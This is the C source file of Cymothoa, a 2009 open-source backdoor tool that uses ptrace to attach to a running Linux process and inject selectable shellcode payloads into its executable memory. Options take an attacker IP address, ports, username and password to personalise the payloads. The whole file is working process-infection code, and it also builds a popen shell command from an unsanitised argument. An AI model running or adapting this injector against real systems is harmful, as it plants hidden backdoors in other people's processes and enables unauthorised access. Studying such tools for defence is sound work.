/*
 * CYMOTHOA.C
 *
 * Copyright (C) 2009
 * codwizard <codwizard@gmail.com>, crossbower <crossbower@gmail.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */


#include "cymothoa.h"

// Print usage
void print_usage(int ret_val)
{
    printf("%s\n%s\n", banner, info);
    printf("%s", usage_text);
    exit(ret_val);
}

// Initialize payload buffer and vars
void payload_init(void)
{
    int use_fork = 0;

    // check if fork_shellcode is enabled
    if((payloads[args.payload_index].options & OPT_NEED_FORK) && args.no_fork==0)
        use_fork=1;

    if (use_fork) fork_shellcode_len = strlen(fork_shellcode);
    main_shellcode_len = strlen(payloads[args.payload_index].shellcode);

    if (use_fork) payload_len = fork_shellcode_len + main_shellcode_len;
    else          payload_len = main_shellcode_len;

    if(!(sh_buffer = malloc(payload_len + 1))) exit(-1);

    memset(sh_buffer, 0x0, payload_len + 1);

    if (use_fork) strcat(sh_buffer, fork_shellcode);
    strcat(sh_buffer, payloads[args.payload_index].shellcode);
}

// Free the payload buffer
void payload_destroy(void)
{
    free(sh_buffer);
}

// Search library region
int search_lib_region(pid_t pid, char *lib_name)
{
    FILE *maps = NULL;
    char cmd[1024];
    char output[1024];

    int region=0;

    if (lib_name==NULL) {
        // search /lib/ld-xxxx region, that is no longer needed by the process
        // and is mapped (usually) r-xp (readable-executable, not writable)
        lib_name = "/lib/ld";
    }

    // assemble cmd
    sprintf(cmd, "cat /proc/%d/maps | grep %s | grep 'xp '", pid, lib_name);

    // read output
    maps = popen(cmd, "r");
    fgets(output, 1024-1, maps);
    pclose(maps);

    // get region
    sscanf(output, "%x", &region);

    return region;
}

// Injection Function
int ptrace_inject(pid_t pid, long memaddr, void *buf, int buflen)
{

    long data;

    while (buflen > 0) {
        memcpy(&data, buf, BLOCK_SIZE);

        if ( ptrace(PTRACE_POKETEXT, pid, memaddr, data) < 0 ) {
            perror("Oopsie!");
            ptrace(PTRACE_DETACH, pid, NULL, NULL);

            return -1;
       }

       memaddr += BLOCK_SIZE;
       buf     += BLOCK_SIZE;
       buflen  -= BLOCK_SIZE;
    }

    return 1;
}

// Infect function
int ptrace_infect()
{
        // set standard arguments
        pid_t pid      = args.pid;
        int pl         = args.payload_index;
        char *lib_name = args.lib_name;

        // other variables
        int i=0, ptr, beg, error;
        struct user_regs_struct reg;

        printf("[+] attaching to process %d\n",pid);

        error = ptrace(PTRACE_ATTACH,pid,0,0);    // attaching to process
        if (error == -1) {
            printf("[-] attaching failed. exiting...\n");
            exit(1);
        }

        waitpid(pid,NULL,0);

        ptrace(PTRACE_GETREGS,pid,&reg,&reg);       // general purpose registers

        printf("\n register info: \n");
        printf(" -----------------------------------------------------------\n");
        printf(" eax value: 0x%lx\t", reg.AX);
        printf(" ebx value: 0x%lx\n", reg.BX);
        printf(" esp value: 0x%lx\t", reg.STACK_POINTER);
        printf(" eip value: 0x%lx\n", reg.INST_POINTER);
        printf(" ------------------------------------------------------------\n\n");

       reg.STACK_POINTER -= BLOCK_SIZE; // decrement STACK_POINTER

       printf("[+] new esp: 0x%.8lx\n", reg.STACK_POINTER);

       ptrace(PTRACE_POKETEXT, pid, reg.STACK_POINTER, reg.INST_POINTER);  // poke INST_POINTER -> STACK_POINTER

        // get the address for our shellcode
        ptr = beg = search_lib_region(pid, lib_name);

        printf("[+] injecting code into 0x%.8x\n", beg);

        reg.INST_POINTER = beg + 2;
        printf("[+] copy general purpose registers\n");
        ptrace(PTRACE_SETREGS,pid,&reg,&reg);

        // inject the shellcode
        ptrace_inject(pid, ptr, sh_buffer, payload_len+1);

        printf("[+] detaching from %d\n\n", pid);

        ptrace(PTRACE_DETACH,pid,0,0);    /* detach from proccess */

        printf("[+] infected!!!\n");

        return(0);
}

/*
 * This function parse the arguments of the program and fills args structure
 */
int parse_arguments(int argc,char **argv)
{

    int c;
    opterr = 0;
    payload_count = 0;

    // clean the arguments structure
    memset(&args, 0, sizeof(args));
    args.payload_index=-1;

    // list of the options getopt have to get
    char short_options[] = "p:s:l:x:y:r:z:o:i:c:FhS";

    // PARSE ARGUMENTS...

    while ((c = getopt (argc, argv, short_options)) != -1) {
        switch (c) {

            case 'p': // process pid
                args.pid = atoi(optarg);
                break;

            case 's': // payload index (shellcode)
                args.payload_index = atoi(optarg);
                break;

            case 'l': // library region where to put the shellcode
                args.lib_name = optarg;
                break;

            case 'x': // option ip address
                args.my_ip = inet_addr(optarg);
                break;

            case 'y': // option port number
                args.my_port = htons(atoi(optarg));
                break;

            case 'r': // option port number 2
                args.my_port2 = htons(atoi(optarg));
                break;

            case 'z': // option username
                args.my_username = optarg;
                break;

            case 'o': // option password
                args.my_password = optarg;
                break;

            case 'i': // script interpreter
                args.interpreter = optarg;
                break;

            case 'c': // script code
                args.script_code = optarg;
                break;

            case 'F': // do not use fork shellcode
                args.no_fork = 1;
                break;

            case 'h': // show help/usage
                args.show_help = 1;
                break;

            case 'S': // show payloads
                args.show_payloads = 1;
                break;

            case '?':
                fprintf (stderr, "Error with option: %c. Check the usage...\n", optopt);
                return 0;
        }
    }

    // ACTIONS...

    // show help/usage screen
    if (args.show_help) {
        print_usage(0);
    }

    // show payloads
    if (args.show_payloads) {
        int count = 0;

        printf("\n");
        while(payloads[count].shellcode != NULL) {
            printf("%d - %s\n", count, payloads[count].description);
            count++;
        }

        exit(0);
    }

    // COUNT PAYLOADS

    while(payloads[payload_count].shellcode != NULL) payload_count++;

    // CHECK ARGUMENTS...

    if (args.pid==0 || args.payload_index < 0 || args.payload_index > payload_count) {
        print_usage(1);
    }

    return 1;
}

// Main function
int main(int argc,char **argv)
{

    // parse and check command line arguments
    if ( parse_arguments(argc, argv) == 0 ) {
        return 1;
    }

    // initialize payload buffer and vars
    payload_init();

    // free payload buffer when exiting or when an error occures
    atexit(payload_destroy);


    // personalize shellcode if required
    personalize_shellcode();

    // infect the process
    if ( ptrace_infect() == 0 ) {
        return 1;
    }

    return 0;
}


